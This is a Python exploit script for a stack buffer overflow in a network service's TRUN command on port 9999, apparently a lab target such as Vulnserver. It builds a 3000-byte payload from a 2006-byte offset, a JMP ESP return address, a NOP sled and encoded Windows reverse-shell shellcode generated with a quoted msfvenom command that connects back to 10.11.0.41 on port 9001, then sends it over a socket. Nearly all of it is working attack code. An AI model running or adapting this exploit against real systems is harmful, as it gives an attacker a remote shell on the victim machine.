#!/usr/bin/python
import socket

#[*] Exact match at offset 2006

buffer = "A" * 2006

# 625011AF   FFE4             JMP ESP

eip = "\xaf\x11\x50\x62"

# known bad chars \x00
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=9001 EXITFUNC=thread -b "\x00" -e x86/shikata_ga_nai -v shellcode -f python
# Payload size: 351 bytes

shellcode =  ""
shellcode += "\xbb\x3c\xec\x78\xbe\xd9\xc1\xd9\x74\x24\xf4\x5d"
shellcode += "\x31\xc9\xb1\x52\x31\x5d\x12\x03\x5d\x12\x83\xf9"
shellcode += "\xe8\x9a\x4b\xfd\x19\xd8\xb4\xfd\xd9\xbd\x3d\x18"
shellcode += "\xe8\xfd\x5a\x69\x5b\xce\x29\x3f\x50\xa5\x7c\xab"
shellcode += "\xe3\xcb\xa8\xdc\x44\x61\x8f\xd3\x55\xda\xf3\x72"
shellcode += "\xd6\x21\x20\x54\xe7\xe9\x35\x95\x20\x17\xb7\xc7"
shellcode += "\xf9\x53\x6a\xf7\x8e\x2e\xb7\x7c\xdc\xbf\xbf\x61"
shellcode += "\x95\xbe\xee\x34\xad\x98\x30\xb7\x62\x91\x78\xaf"
shellcode += "\x67\x9c\x33\x44\x53\x6a\xc2\x8c\xad\x93\x69\xf1"
shellcode += "\x01\x66\x73\x36\xa5\x99\x06\x4e\xd5\x24\x11\x95"
shellcode += "\xa7\xf2\x94\x0d\x0f\x70\x0e\xe9\xb1\x55\xc9\x7a"
shellcode += "\xbd\x12\x9d\x24\xa2\xa5\x72\x5f\xde\x2e\x75\x8f"
shellcode += "\x56\x74\x52\x0b\x32\x2e\xfb\x0a\x9e\x81\x04\x4c"
shellcode += "\x41\x7d\xa1\x07\x6c\x6a\xd8\x4a\xf9\x5f\xd1\x74"
shellcode += "\xf9\xf7\x62\x07\xcb\x58\xd9\x8f\x67\x10\xc7\x48"
shellcode += "\x87\x0b\xbf\xc6\x76\xb4\xc0\xcf\xbc\xe0\x90\x67"
shellcode += "\x14\x89\x7a\x77\x99\x5c\x2c\x27\x35\x0f\x8d\x97"
shellcode += "\xf5\xff\x65\xfd\xf9\x20\x95\xfe\xd3\x48\x3c\x05"
shellcode += "\xb4\x7c\xca\x05\x6d\xe9\xce\x05\x4e\xc0\x47\xe3"
shellcode += "\xfa\x02\x0e\xbc\x92\xbb\x0b\x36\x02\x43\x86\x33"
shellcode += "\x04\xcf\x25\xc4\xcb\x38\x43\xd6\xbc\xc8\x1e\x84"
shellcode += "\x6b\xd6\xb4\xa0\xf0\x45\x53\x30\x7e\x76\xcc\x67"
shellcode += "\xd7\x48\x05\xed\xc5\xf3\xbf\x13\x14\x65\x87\x97"
shellcode += "\xc3\x56\x06\x16\x81\xe3\x2c\x08\x5f\xeb\x68\x7c"
shellcode += "\x0f\xba\x26\x2a\xe9\x14\x89\x84\xa3\xcb\x43\x40"
shellcode += "\x35\x20\x54\x16\x3a\x6d\x22\xf6\x8b\xd8\x73\x09"
shellcode += "\x23\x8d\x73\x72\x59\x2d\x7b\xa9\xd9\x4d\x9e\x7b"
shellcode += "\x14\xe6\x07\xee\x95\x6b\xb8\xc5\xda\x95\x3b\xef"
shellcode += "\xa2\x61\x23\x9a\xa7\x2e\xe3\x77\xda\x3f\x86\x77"
shellcode += "\x49\x3f\x83"

nops = "\x90" * 10

remaining = "C" * (3000 - len(buffer) - len(eip) - len(nops) - len(shellcode))

payload = buffer + eip + nops + shellcode + remaining

print("Throwing evil payload of size %s at TRUN option" % len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.11.20.27",9999))
s.recv(1024)
s.send("TRUN ." + payload)
s.recv(1024)
s.close()